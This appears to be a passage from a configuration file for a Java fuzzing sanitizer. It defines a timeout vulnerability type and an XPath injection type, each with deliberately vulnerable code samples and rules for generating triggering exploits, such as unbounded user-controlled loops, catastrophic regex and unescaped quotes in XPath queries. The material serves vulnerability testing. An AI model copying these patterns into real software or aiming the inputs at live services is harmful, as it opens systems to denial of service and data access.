    3. Valid Exploit Patterns - Use ONLY these:
       ```java
       // Infinite or excessive loops
       String input = getUserInput();  // Attacker controlled
       int count = Integer.parseInt(input);
       for (int i = 0; i < count; i++) {
           performOperation();  // Will timeout with large count
       }

       // Infinite while loop
       String condition = request.getParameter("condition");
       while (evaluateCondition(condition)) {  // Will never terminate if condition always true
           performOperation();
       }

       // Sleep with user-controlled duration
       String delayStr = request.getParameter("delay");
       long delay = Long.parseLong(delayStr);
       Thread.sleep(delay);  // Will timeout with large delay

       // Recursive function with user-controlled depth
       int depth = Integer.parseInt(request.getParameter("depth"));
       if (depth > 0) {
           recursiveFunction(depth - 1);  // Will timeout with large depth
       }

       // Regex with potential catastrophic backtracking
       String pattern = request.getParameter("pattern");  // User provides "(a+)+"
       String text = "aaaaaaaaaaaaaaaaaaaa";
       Pattern.compile(pattern).matcher(text).matches();  // Will timeout
       ```

    4. Invalid Patterns - NEVER use these:
       ```java
       // NO fixed, reasonable loop bounds
       for (int i = 0; i < 100; i++) {  // Fixed reasonable count
           performOperation();
       }

       // NO fixed, reasonable sleep duration
       Thread.sleep(1000);  // Fixed reasonable delay

       // NO validation that prevents excessive values
       String input = getUserInput();
       int count = Integer.parseInt(input);
       if (count > 1000) count = 1000;  // Validation prevents timeout
       for (int i = 0; i < count; i++) {
           performOperation();
       }

       // NO timeout mechanisms
       ExecutorService executor = Executors.newSingleThreadExecutor();
       Future<?> future = executor.submit(() -> performLongOperation());
       try {
           future.get(5, TimeUnit.SECONDS);  // Has timeout protection
       } catch (TimeoutException e) {
           future.cancel(true);
       }

       // NO regex patterns with syntax errors (handled by RegexInjection vulnerability type)
       Pattern.compile("[");  // Syntax error - unclosed character class
       Pattern.compile("(");  // Syntax error - unclosed group
       ```

    Note: The exploit doesn't need to actually cause a timeout during testing, but it must demonstrate the potential for a timeout in a production environment where the input is fully attacker-controlled and the operation might be performed on larger data or in a more resource-constrained environment.
XPathInjection:
  description: |-
    XPath injection vulnerability occurs when untrusted input containing quotes is used in XPath expressions without proper escaping. This allows attackers to modify the query structure and access unauthorized XML data.

    Java Example Patterns:
    ```java
    // Direct user input in XPath
    String username = request.getParameter("user");
    xpath.compile("/users/user[@name='" + username + "']");  // Vulnerable to injection

    // Dynamic attribute query
    String attr = request.getParameter("attr");
    xpath.evaluate("/users/user[@" + attr + "='admin']", doc);  // Vulnerable to injection

    // Value comparison
    String value = request.getParameter("value");
    xpath.evaluateExpression("//data[text()='" + value + "']", doc);  // Vulnerable to injection
    ```

  exploit: |-
    To generate a valid exploit for this sanitizer, follow these strict requirements:

    1. Target Implementation:
       - The sanitizer hooks XPath evaluation methods:
         * javax.xml.xpath.XPath.compile
         * javax.xml.xpath.XPath.evaluate
         * javax.xml.xpath.XPath.evaluateExpression
       - Must trigger XPathExpressionException with TransformerException as root cause

    2. Mandatory Requirements:
       - Goal: Cause XPath syntax error through unmatched quotes
       - Expression MUST contain unmatched quotes (' or ")
       - Expression MUST cause a TransformerException
       - Expression MUST be executed through hooked XPath methods

    3. Valid Exploit Patterns - Use ONLY these:
       ```java
       XPath xpath = XPathFactory.newInstance().newXPath();

       // Unmatched single quote
       xpath.compile("/users/user[@name='alice]");

       // Unmatched double quote
       xpath.evaluate("/users/user[@id=\"123]", doc);

       // Mixed quotes causing mismatch
       xpath.evaluateExpression("/users/user[@type='admin\"]", doc);
       ```

    4. Invalid Patterns - NEVER use these:
       ```java
       // NO properly matched quotes
       xpath.compile("/users/user[@name='alice']");
       xpath.evaluate("/users/user[@id=\"123\"]", doc);

       // NO non-quote syntax errors
       xpath.compile("invalid{xpath}");
       xpath.evaluate("//[invalid]", doc);

       // NO wrong methods
       otherMethod("/users/user[@name='alice]");
       document.evaluate("/users/user[@name='alice]");
       ```

    Note: The sanitizer specifically looks for unescaped quote characters that cause a TransformerException. The expression must be syntactically invalid due to quote mismatches.
